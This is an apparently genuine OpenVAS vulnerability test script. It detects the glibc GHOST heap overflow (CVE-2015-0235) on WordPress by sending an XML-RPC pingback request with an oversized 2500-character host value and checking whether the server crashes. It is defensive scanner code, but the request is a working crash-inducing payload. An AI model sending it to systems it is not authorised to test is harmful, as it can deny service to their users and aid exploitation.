###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_ghost_72325.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# GNU glibc Remote Heap Buffer Overflow Vulnerability (Wordpress)
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:wordpress:wordpress';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105192");
  script_bugtraq_id(72325);
  script_cve_id("CVE-2015-0235");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13659 $");

  script_name("GNU glibc Remote Heap Buffer Overflow Vulnerability (Wordpress)");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/72325");
  script_xref(name:"URL", value:"http://www.gnu.org/software/libc/");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code in the
context of the affected application. Failed exploit attempts may crash the application, denying service
to legitimate users.");

  script_tag(name:"vuldetect", value:"Send a special crafted XML POST request and check the response");
  script_tag(name:"solution", value:"Update your glibc and reboot.");
  script_tag(name:"summary", value:"The remote host is using a version of glibc which is prone to a heap-based buffer-overflow
vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-01-31 15:37:56 +0100 (Sat, 31 Jan 2015)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");

function _test( boom, port, dir, host ) {

  local_var soc, len, req, recv, port, dir;

  soc = open_sock_tcp( port );
  if( ! soc ) return FALSE;

  xml = '<?xml version="1.0"?>\r\n' +
        ' <methodCall>\r\n' +
        '  <methodName>pingback.ping</methodName>\r\n' +
        '  <params><param><value>\r\n' +
        '    <string>http://' + boom + '/index.php</string>\r\n' +
        '   </value></param>\r\n' +
        '   <param><value>\r\n' +
        '     <string>http://' + boom + '/index.php</string>\r\n' +
        '   </value></param>\r\n' +
        '   </params>\r\n' +
        ' </methodCall>';

  len = strlen( xml );
  useragent = http_get_user_agent();
  req = 'POST ' + dir + '/xmlrpc.php HTTP/1.1\r\n' +
        'Accept: */*\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Length: ' + len + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        '\r\n' +
        xml;

  send( socket:soc, data: req );
  recv = recv( socket:soc, length:1024);

  if( ! recv && socket_get_error( soc ) == ECONNRESET ) recv = 'ECONNRESET';

  close( soc );

  return recv;

}

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

host = http_host_name(port:port);

boom = this_host();
buf = _test( boom:boom, port:port, dir:dir, host:host );

if( "methodResponse" >!< buf ) exit( 0 );

boom = crap( data:"0", length:2500 );
buf = _test( boom:boom, port:port, dir:dir, host:host );

if( buf == 'ECONNRESET' || "500 Internal Server Error" >< buf )
{
  security_message( port:port );
  exit( 0 );
}

exit( 0 );
